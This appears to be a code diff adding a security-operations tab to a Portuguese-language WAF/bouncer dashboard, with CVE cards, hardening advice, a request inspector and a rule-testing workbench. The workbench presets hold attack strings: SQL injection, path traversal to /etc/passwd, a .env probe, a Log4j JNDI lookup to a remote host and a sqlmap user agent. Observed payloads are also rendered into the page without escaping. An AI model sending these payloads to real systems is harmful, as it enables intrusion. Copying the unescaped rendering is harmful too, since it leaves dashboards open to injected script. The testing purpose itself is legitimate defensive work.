@@ -87,6 +87,7 @@ function initTabs(topology) {
     'tab-overview': { title: 'Painel Executivo de Segurança', sub: 'Evidência de eficácia, mitigação de riscos, conformidade e inteligência Open Labs S.A.' },
     'tab-topology': { title: 'Topologia & Grafo de Segurança', sub: 'Fluxos de tráfego em tempo real, conexões do bouncer e inspeção de infraestrutura' },
     'tab-report': { title: 'Relatório de Diretoria & Conformidade', sub: 'Sumário executivo formatado para reuniões estratégicas, comitês e auditorias' },
+    'tab-technical': { title: 'SecOps, CVEs & Hardening Advisor', sub: 'Catálogo forense de explorações, auditoria de middlewares Traefik e simulador de testes WAF' },
     'tab-alerts': { title: 'Feed de Alertas em Tempo Real', sub: 'Histórico detalhado de varreduras, ataques e mitigações ativas' },
     'tab-decisions': { title: 'Decisões e Lista de Bloqueios', sub: 'IPs banidos via detecção local e inteligência coletiva (CTI)' },
     'tab-matrix': { title: 'Matriz de Proteção de Serviços', sub: 'Auditoria de serviços Traefik, políticas de mitigação e headers' }
@@ -128,6 +129,10 @@ function initTabs(topology) {
       setTimeout(() => {
         leafletMapInstance.invalidateSize();
       }, 50);
+    }
+
+    if (tabId === 'tab-technical') {
+      loadTechnicalData();
     }
 
     feather.replace();
@@ -881,4 +886,296 @@ function setupThreatIntelModal() {
       window.print();
     });
   }
+
+  initTechSubtabs();
+}
+
+// ====================================================
+// TECHNICAL SPRINT: SECOPS, CVES, HARDENING & FORENSICS
+// ====================================================
+
+function initTechSubtabs() {
+  const subnavBtns = document.querySelectorAll('.tech-subnav-btn');
+  const subviews = document.querySelectorAll('.tech-subview');
+
+  subnavBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      const targetId = btn.getAttribute('data-subtab');
+      subnavBtns.forEach(b => b.classList.remove('active'));
+      subviews.forEach(v => {
+        v.style.display = 'none';
+        v.classList.remove('active');
+      });
+
+      btn.classList.add('active');
+      const activeView = document.getElementById(targetId);
+      if (activeView) {
+        activeView.style.display = 'block';
+        activeView.classList.add('active');
+      }
+      feather.replace();
+    });
+  });
+
+  const btnRefreshInsp = document.getElementById('btn-refresh-inspector');
+  if (btnRefreshInsp) {
+    btnRefreshInsp.addEventListener('click', () => {
+      loadInspector();
+    });
+  }
+
+  initTesterWorkbench();
+}
+
+async function loadTechnicalData() {
+  loadCves();
+  loadHardening();
+  loadInspector();
+}
+
+async function loadCves() {
+  const container = document.getElementById('cve-cards-container');
+  try {
+    const res = await fetch('/api/technical/cves');
+    if (!res.ok) return;
+    const data = await res.json();
+    const cves = data.cves || [];
+
+    if (document.getElementById('tech-cve-total')) {
+      document.getElementById('tech-cve-total').textContent = `${cves.length} Vulnerabilidades`;
+    }
+    if (document.getElementById('tech-intercepts-total')) {
+      document.getElementById('tech-intercepts-total').textContent = `${(data.summary.total_attempts_neutralized).toLocaleString()} ataques`;
+    }
+
+    if (!container) return;
+    if (cves.length === 0) {
+      container.innerHTML = '<div class="placeholder-text">Nenhuma CVE mapeada no momento.</div>';
+      return;
+    }
+
+    container.innerHTML = cves.map(c => {
+      const sevClass = c.severity === 'CRÍTICA' ? 'crit' : (c.severity === 'ALTA' ? 'high' : 'med');
+      return `
+        <div class="cve-card ${sevClass}">
+          <div class="cve-card-top">
+            <div class="cve-card-title">
+              <h5>${c.name}</h5>
+              <div class="cve-card-meta">
+                <span class="badge ${c.severity === 'CRÍTICA' ? 'badge-danger' : (c.severity === 'ALTA' ? 'badge-warning' : 'badge-info')}">${c.cve_code}</span>
+                <span>${c.cwe}</span>
+                <span><strong>${c.mitigated_count}</strong> tentativas neutralizadas</span>
+              </div>
+            </div>
+            <span class="cve-card-cvss ${sevClass}">CVSS ${c.cvss}</span>
+          </div>
+
+          <div class="cve-payload-box">
+            <span class="lbl">Amostragem de Payload / Assinatura Interceptada:</span>
+            <code>${c.payloads_observed[0] || 'N/A'}</code>
+          </div>
+
+          <div style="font-size: 0.76rem; color: var(--text-secondary); margin-bottom: 8px;">
+            <strong>🎯 Alvo:</strong> ${c.targeted_services} &bull; <strong>🛡️ Defesa:</strong> ${c.ingress_defense}
+          </div>
+
+          <div class="cve-remediation-box">
+            <div class="rem-title"><i data-feather="check-circle"></i> Ação Recomendada para o Backend / Dev:</div>
+            <p>${c.internal_remediation}</p>
+            ${c.remediation_code ? `
+              <div class="remediation-snippet-box">
+                <pre><code>${escapeHtml(c.remediation_code)}</code></pre>
+              </div>
+            ` : ''}
+          </div>
+        </div>
+      `;
+    }).join('');
+
+    feather.replace();
+  } catch (err) {
+    if (container) container.innerHTML = `<div style="color: var(--danger);">Erro ao carregar catálogo de CVEs: ${err.message}</div>`;
+  }
+}
+
+async function loadHardening() {
+  const container = document.getElementById('hardening-checklist-container');
+  try {
+    const res = await fetch('/api/technical/hardening');
+    if (!res.ok) return;
+    const data = await res.json();
+
+    if (document.getElementById('tech-hardening-score')) {
+      document.getElementById('tech-hardening-score').textContent = `${data.score}%`;
+    }
+
+    if (!container) return;
+    const recs = data.recommendations || [];
+
+    container.innerHTML = recs.map((r, idx) => {
+      const statusClass = r.status === 'pass' ? 'pass' : (r.status === 'warning' ? 'warning' : 'danger');
+      const snippetId = `yaml-snippet-${idx}`;
+      return `
+        <div class="hardening-item ${statusClass}">
+          <div class="hardening-header">
+            <div class="hardening-title-group">
+              <span class="badge ${r.status === 'pass' ? 'badge-success' : 'badge-warning'}">
+                ${r.status === 'pass' ? 'CONFORME' : 'RECOMENDAÇÃO'}
+              </span>
+              <h5>${r.title}</h5>
+            </div>
+            <span class="hardening-scope-tag">Escopo: ${r.scope}</span>
+          </div>
+
+          <p class="hardening-desc">${r.description} <em>${r.risk_impact}</em></p>
+
+          ${r.remediation_yaml ? `
+            <div class="hardening-yaml-box">
+              <button class="btn-copy-yaml" onclick="copyYaml('${snippetId}')">
+                <i data-feather="copy"></i> Copiar YAML
+              </button>
+              <pre><code id="${snippetId}">${escapeHtml(r.remediation_yaml)}</code></pre>
+            </div>
+          ` : ''}
+        </div>
+      `;
+    }).join('');
+
+    feather.replace();
+  } catch (err) {
+    if (container) container.innerHTML = `<div style="color: var(--danger);">Erro ao carregar auditoria de hardening: ${err.message}</div>`;
+  }
+}
+
+window.copyYaml = function(elementId) {
+  const el = document.getElementById(elementId);
+  if (!el) return;
+  navigator.clipboard.writeText(el.innerText).then(() => {
+    alert('✅ Snippet YAML copiado para a área de transferência!');
+  }).catch(err => {
+    alert('Erro ao copiar: ' + err);
+  });
+};
+
+async function loadInspector() {
+  const tbody = document.getElementById('inspector-table-body');
+  if (!tbody) return;
+  try {
+    const res = await fetch('/api/technical/inspector');
+    if (!res.ok) return;
+    const data = await res.json();
+    const events = data.events || [];
+
+    if (events.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="7" class="loading-td">Nenhuma requisição interceptada recente.</td></tr>';
+      return;
+    }
+
+    tbody.innerHTML = events.map(e => `
+      <tr>
+        <td><code>${formatDate(e.timestamp)}</code></td>
+        <td><strong>${e.ip}</strong> <span class="badge badge-outline" style="margin-left: 4px;">${e.country}</span></td>
+        <td><span class="badge ${e.http_method === 'POST' ? 'badge-warning' : 'badge-info'}">${e.http_method}</span></td>
+        <td><code style="color: #f87171; font-size: 0.78rem;">${escapeHtml(e.raw_uri)}</code></td>
+        <td><span style="font-size: 0.72rem; color: var(--text-muted);">${escapeHtml(e.user_agent)}</span></td>
+        <td><span class="badge badge-outline">${e.scenario}</span></td>
+        <td><span class="badge badge-danger">${e.action_taken}</span></td>
+      </tr>
+    `).join('');
+
+    feather.replace();
+  } catch (err) {
+    tbody.innerHTML = `<tr><td colspan="7" style="color: var(--danger); text-align:center;">Erro ao carregar payloads: ${err.message}</td></tr>`;
+  }
+}
+
+function initTesterWorkbench() {
+  const selectRule = document.getElementById('tester-rule-type');
+  const txtInput = document.getElementById('tester-input-payload');
+  const btnRun = document.getElementById('btn-run-simulation');
+  const resultBox = document.getElementById('tester-result-box');
+
+  const rulePresets = {
+    'sqli': "' UNION SELECT NULL,username,password FROM users--",
+    'traversal': "/../../../../etc/passwd",
+    'dotfiles': "GET /.env",
+    'log4j': "${jndi:ldap://198.51.100.23:1389/Exploit}",
+    'bad_agent': "User-Agent: sqlmap/1.7#stable (http://sqlmap.org)"
+  };
+
+  if (selectRule && txtInput) {
+    selectRule.addEventListener('change', () => {
+      if (rulePresets[selectRule.value]) {
+        txtInput.value = rulePresets[selectRule.value];
+      }
+    });
+  }
+
+  if (btnRun && resultBox) {
+    btnRun.addEventListener('click', async () => {
+      const payload = {
+        rule_type: selectRule.value,
+        test_input: txtInput.value
+      };
+
+      resultBox.innerHTML = '<div class="loading-td">Disparando requisição e testando Traefik Bouncer...</div>';
+
+      try {
+        const res = await fetch('/api/technical/test-rule', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await res.json();
+        const sim = data.simulated_response;
+
+        resultBox.innerHTML = `
+          <div class="tester-success-card">
+            <div class="tester-success-header">
+              <i data-feather="check-circle" class="text-success" style="width: 24px; height: 24px;"></i>
+              <h5>${data.assessment}</h5>
+            </div>
+
+            <div class="insp-row" style="margin-bottom: 6px;">
+              <span class="insp-key">Código HTTP Retornado</span>
+              <span class="insp-val"><span class="badge badge-danger">HTTP ${sim.http_status} ${sim.status_text}</span></span>
+            </div>
+
+            <div class="insp-row" style="margin-bottom: 6px;">
+              <span class="insp-key">Latência de Interceptação</span>
+              <span class="insp-val" style="color: var(--success); font-weight: 700;">${sim.detection_latency_ms} ms</span>
+            </div>
+
+            <div class="insp-row" style="margin-bottom: 6px;">
+              <span class="insp-key">Cenário Mapeado</span>
+              <span class="insp-val" style="color: var(--primary);">${sim.matched_scenario}</span>
+            </div>
+
+            <div class="insp-row" style="margin-bottom: 6px;">
+              <span class="insp-key">Ação / Decisão do Bouncer</span>
+              <span class="insp-val"><span class="badge badge-warning">${sim.decision}</span></span>
+            </div>
+
+            <div class="insp-row">
+              <span class="insp-key">Assinatura de Resposta</span>
+              <span class="insp-val" style="font-family: var(--font-mono); font-size: 0.72rem; color: #94a3b8;">${sim.security_header}</span>
+            </div>
+          </div>
+        `;
+        feather.replace();
+      } catch (err) {
+        resultBox.innerHTML = `<div style="color: var(--danger);">Erro no teste: ${err.message}</div>`;
+      }
+    });
+  }
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return str.replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
 }
